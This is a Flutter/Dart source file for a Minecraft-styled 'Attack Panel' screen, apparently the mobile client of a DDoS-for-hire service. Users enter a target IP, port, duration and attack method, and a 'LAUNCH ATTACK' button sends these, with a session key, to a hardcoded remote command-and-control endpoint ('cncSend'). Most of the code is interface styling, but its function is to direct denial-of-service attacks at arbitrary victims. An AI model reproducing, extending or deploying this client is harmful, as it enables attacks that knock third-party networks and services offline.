import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final portController = TextEditingController();
  final String baseUrl = "http://dwixclouds.cloudnesia.my.id:3013";
  late AnimationController _controller;
  String selectedDoosId = "";
  double attackDuration = 60;

  // ===== COLOR PALETTE - MINECRAFT THEME =====
  static const Color bgMain = Color(0xFF1A1A1A);          // Obsidian
  static const Color bgSurface = Color(0xFF2D2D2D);       // Stone
  static const Color bgCard = Color(0xFF3D3D3D);          // Cobblestone
  static const Color textMain = Color(0xFFE8E8E8);        // White wool
  static const Color textSub = Color(0xFFAAAAAA);         // Gray
  static const Color accentWhite = Color(0xFF4CAF50);     // Grass green
  static const Color borderLight = Color(0xFF5D5D5D);     // Stone border
  static const Color mcGold = Color(0xFFFFD700);          // Gold
  static const Color mcDiamond = Color(0xFF4DD0E1);       // Diamond
  static const Color mcRedstone = Color(0xFFFF5252);      // Redstone
  static const Color mcEmerald = Color(0xFF00E676);       // Emerald

  @override
  void initState() {
    super.initState();
    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }
  }

  Future<void> _sendDoos() async {
    final target = targetController.text.trim();
    final port = portController.text.trim();
    final key = widget.sessionKey;
    final int duration = attackDuration.toInt();

    if (target.isEmpty || key.isEmpty) {
      _showAlert("Invalid Input", "Target IP cannot be empty.");
      return;
    }

    if (selectedDoosId != "icmp" && (port.isEmpty || int.tryParse(port) == null)) {
      _showAlert("Invalid Port", "Please input a valid port.");
      return;
    }

    try {
      final uri = Uri.parse(
          "$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId&port=${port.isEmpty ? 0 : port}&duration=$duration");
      final res = await http.get(uri);
      final data = jsonDecode(res.body);
      print(data);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Please wait a moment before sending again.");
      } else if (data["valid"] == false) {
        _showAlert("Invalid Key", "Your session key is invalid. Please log in again.");
      } else if (data["sended"] == false) {
        _showAlert("Failed", "Failed to send attack. The server may be under maintenance.");
      } else {
        _showAlert("Success", "Attack has been successfully sent to $target.");
      }
    } catch (_) {
      _showAlert("Error", "An unexpected error occurred. Please try again.");
    }
  }

  // ===== ALERT DIALOG - MINECRAFT STYLE =====
  void _showAlert(String title, String msg) {
    final isSuccess = title.toLowerCase().contains("success");
    final isError = title.toLowerCase().contains("error") ||
                    title.toLowerCase().contains("invalid") ||
                    title.toLowerCase().contains("failed");
    final borderColor = isSuccess ? mcEmerald : (isError ? mcRedstone : mcGold);

    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.75),
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        elevation: 0,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: bgCard,
            borderRadius: BorderRadius.circular(4),
            border: Border.all(color: borderColor, width: 3),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.8),
                blurRadius: 0,
                offset: const Offset(8, 8),
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: bgSurface,
                  border: Border.all(color: borderColor, width: 3),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.black.withOpacity(0.6),
                      blurRadius: 0,
                      offset: const Offset(4, 4),
                    )
                  ],
                ),
                child: Icon(
                  isSuccess
                      ? Icons.check_circle_outline
                      : (isError ? Icons.error_outline : Icons.info_outline),
                  color: borderColor,
                  size: 32,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                title.toUpperCase(),
                style: const TextStyle(
                  color: textMain,
                  fontSize: 15,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                  shadows: [
                    Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                  ],
                ),
              ),
              const SizedBox(height: 12),
              Text(
                msg,
                style: const TextStyle(color: textSub, fontSize: 12),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                height: 50,
                child: ElevatedButton(
                  onPressed: () => Navigator.pop(context),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: borderColor,
                    foregroundColor: Colors.white,
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.zero,
                      side: BorderSide(color: Colors.black, width: 2),
                    ),
                    elevation: 0,
                  ),
                  child: const Text(
                    "OK",
                    style: TextStyle(
                      fontWeight: FontWeight.bold,
                      fontSize: 13,
                      letterSpacing: 1.5,
                      shadows: [
                        Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == "icmp";
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: bgMain,
        elevation: 0,
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: () => Navigator.pop(context),
        ),
        title: const Text(
          "ATTACK PANEL",
          style: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 14,
            letterSpacing: 1.5,
            color: textMain,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        centerTitle: true,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(
            height: 3,
            color: accentWhite,
          ),
        ),
      ),
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [bgMain, bgSurface, bgMain],
          ),
        ),
        child: SafeArea(
          child: SingleChildScrollView(
            padding: const EdgeInsets.all(20),
            child: Column(
              children: [
                // LOGO - MINECRAFT STYLE
                FadeTransition(
                  opacity: Tween(begin: 0.5, end: 1.0).animate(_controller),
                  child: Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: bgCard,
                      border: Border.all(color: accentWhite, width: 3),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.7),
                          blurRadius: 0,
                          offset: const Offset(6, 6),
                        ),
                      ],
                    ),
                    child: Image.asset(
                      'assets/images/logo.png',
                      width: 120,
                      height: 120,
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                const Text(
                  "TARGET INPUT & METHODS",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1.5,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const SizedBox(height: 12),
                Container(
                  height: 3,
                  color: accentWhite,
                ),
                const SizedBox(height: 25),

                // === TARGET INPUT CARD ===
                _buildInputCard(
                  icon: Icons.computer,
                  title: "TARGET IP",
                  child: TextField(
                    controller: targetController,
                    style: const TextStyle(
                      color: textMain,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                    ),
                    cursorColor: accentWhite,
                    cursorWidth: 3,
                    decoration: _inputStyle("Target IP (e.g. 1.1.1.1)"),
                  ),
                ),
                const SizedBox(height: 20),

                // === PORT INPUT CARD ===
                _buildInputCard(
                  icon: Icons.wifi_tethering,
                  title: "PORT",
                  child: TextField(
                    controller: portController,
                    enabled: !isIcmp,
                    keyboardType: TextInputType.number,
                    style: TextStyle(
                      color: isIcmp ? textSub : textMain,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                    ),
                    cursorColor: isIcmp ? textSub : accentWhite,
                    cursorWidth: 3,
                    decoration: _inputStyle(
                      isIcmp ? "ICMP does not use port" : "Port (e.g. 80)",
                      isIcmp: isIcmp,
                    ),
                  ),
                ),
                const SizedBox(height: 20),

                // === DURATION SLIDER CARD ===
                _buildInputCard(
                  icon: Icons.timer,
                  title: "ATTACK DURATION",
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        "${attackDuration.toInt()} seconds",
                        style: const TextStyle(
                          color: textMain,
                          fontSize: 13,
                          fontWeight: FontWeight.bold,
                          shadows: [
                            Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                          ],
                        ),
                      ),
                      const SizedBox(height: 8),
                      SliderTheme(
                        data: SliderTheme.of(context).copyWith(
                          activeTrackColor: accentWhite,
                          inactiveTrackColor: bgSurface,
                          thumbColor: accentWhite,
                          overlayColor: accentWhite.withOpacity(0.2),
                          trackHeight: 8,
                          thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 12),
                        ),
                        child: Slider(
                          value: attackDuration,
                          min: 10,
                          max: 300,
                          divisions: 29,
                          label: "${attackDuration.toInt()}s",
                          onChanged: (value) {
                            setState(() => attackDuration = value);
                          },
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 20),

                // === DROPDOWN ATTACK METHODS ===
                _buildInputCard(
                  icon: Icons.flash_on,
                  title: "ATTACK METHOD",
                  child: DropdownButtonHideUnderline(
                    child: DropdownButton<String>(
                      dropdownColor: bgSurface,
                      value: selectedDoosId,
                      isExpanded: true,
                      iconEnabledColor: accentWhite,
                      style: const TextStyle(
                        color: textMain,
                        fontSize: 13,
                        fontWeight: FontWeight.bold,
                      ),
                      items: widget.listDoos.map((doos) {
                        return DropdownMenuItem<String>(
                          value: doos['ddos_id'],
                          child: Text(
                            doos['ddos_name'],
                            style: const TextStyle(
                              color: textMain,
                              fontSize: 13,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        );
                      }).toList(),
                      onChanged: (value) {
                        setState(() {
                          selectedDoosId = value!;
                        });
                      },
                    ),
                  ),
                ),
                const SizedBox(height: 40),

                // === SEND BUTTON ===
                SizedBox(
                  width: double.infinity,
                  height: 58,
                  child: ElevatedButton.icon(
                    onPressed: _sendDoos,
                    icon: const Icon(Icons.bolt, color: Colors.white, size: 22),
                    label: const Text(
                      "LAUNCH ATTACK",
                      style: TextStyle(
                        fontSize: 13,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 1.5,
                        color: Colors.white,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                        ],
                      ),
                    ),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: accentWhite,
                      shape: const RoundedRectangleBorder(
                        borderRadius: BorderRadius.zero,
                        side: BorderSide(color: Colors.black, width: 3),
                      ),
                      elevation: 0,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ===== INPUT CARD - MINECRAFT STYLE =====
  Widget _buildInputCard({required IconData icon, required String title, required Widget child}) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: bgCard,
        borderRadius: BorderRadius.circular(4),
        border: Border.all(color: accentWhite, width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.7),
            blurRadius: 0,
            offset: const Offset(5, 5),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: bgSurface,
                  border: Border.all(color: accentWhite, width: 2),
                ),
                child: Icon(icon, color: accentWhite, size: 18),
              ),
              const SizedBox(width: 10),
              Text(
                title,
                style: const TextStyle(
                  color: textMain,
                  fontWeight: FontWeight.bold,
                  fontSize: 12,
                  letterSpacing: 1.2,
                  shadows: [
                    Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          child,
        ],
      ),
    );
  }

  // ===== INPUT STYLE - MINECRAFT =====
  InputDecoration _inputStyle(String hint, {bool isIcmp = false}) {
    final borderColor = isIcmp ? borderLight : accentWhite;
    return InputDecoration(
      hintText: hint,
      hintStyle: TextStyle(
        color: Colors.white.withOpacity(0.25),
        fontSize: 12,
      ),
      filled: true,
      fillColor: bgSurface,
      contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 14),
      enabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: borderColor, width: 3),
        borderRadius: BorderRadius.zero,
      ),
      focusedBorder: const OutlineInputBorder(
        borderSide: BorderSide(color: mcGold, width: 3),
        borderRadius: BorderRadius.zero,
      ),
      disabledBorder: OutlineInputBorder(
        borderSide: BorderSide(color: borderLight, width: 3),
        borderRadius: BorderRadius.zero,
      ),
    );
  }

  @override
  void dispose() {
    _controller.dispose();
    targetController.dispose();
    portController.dispose();
    super.dispose();
  }
}